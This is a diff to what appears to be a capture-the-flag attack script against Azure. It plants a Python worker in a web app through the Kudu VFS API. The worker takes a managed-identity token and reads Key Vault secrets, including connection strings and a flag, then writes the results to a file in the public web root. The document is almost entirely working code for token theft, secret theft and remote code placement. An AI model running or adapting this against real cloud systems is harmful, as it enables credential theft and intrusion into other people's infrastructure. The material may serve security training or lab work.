@@ -30,19 +30,21 @@ worker='''import os,json,urllib.parse,urllib.request,urllib.error\nIE=os.environ
 worker=worker.replace('\\n+','\\n').replace('+','')
 worker_lines=[
 "import os,json,urllib.parse,urllib.request,urllib.error",
-"IE=os.environ.get('IDENTITY_ENDPOINT','http://169.254.131.3:8081/msi/token'); IH=os.environ.get('IDENTITY_HEADER','')",
+"IE=os.environ.get('IDENTITY_ENDPOINT','http://169.254.131.3:8081/msi/token'); IH=os.environ.get('IDENTITY_HEADER',''); OUT='/home/site/wwwroot/flag_result.txt'",
+"def p(*x):",
+" s=' '.join(map(str,x)); print(s,flush=True); open(OUT,'a').write(s+'\\n')",
 "def g(u,h={}):",
 " try:",
-"  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=20); return r.status,r.read().decode(errors='replace')",
+"  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=3); return r.status,r.read().decode(errors='replace')",
 " except urllib.error.HTTPError as e:return e.code,e.read().decode(errors='replace')",
 " except Exception as e:return 0,str(e)",
 "q=IE+'?resource='+urllib.parse.quote('https://vault.azure.net',safe='')+'&api-version=2019-08-01'",
 "q+='&client_id=7a85156a-01c4-4e61-8472-40a92107159b'",
-"s,b=g(q,{'X-IDENTITY-HEADER':IH}); print('IDENTITY',s,b[:500])",
+"s,b=g(q,{'X-IDENTITY-HEADER':IH}); p('IDENTITY',s,b[:500])",
 "try:t=json.loads(b)['access_token']",
 "except:t=''",
 "for n in ['flag','tbl-flag','config-storage-connection','storage-connection','internal-config']:",
-" s,b=g('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/'+n+'?api-version=7.4',{'Authorization':'Bearer '+t}); print('SECRET',n,s,b)",
+" s,b=g('https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/'+n+'?api-version=7.4',{'Authorization':'Bearer '+t}); p('SECRET',n,s,b)",
 ]
 worker='\n'.join(worker_lines)
 a=base64.b64encode((ku+':'+kp).encode()).decode(); u=f'https://{APP}.scm.azurewebsites.net/api/vfs/site/wwwroot/readflag.py'; s,b=rq(u,'PUT',worker.encode(),{'Authorization':'Basic '+a,'If-Match':'*'},40); print('vfs',s,b[:200],flush=True)
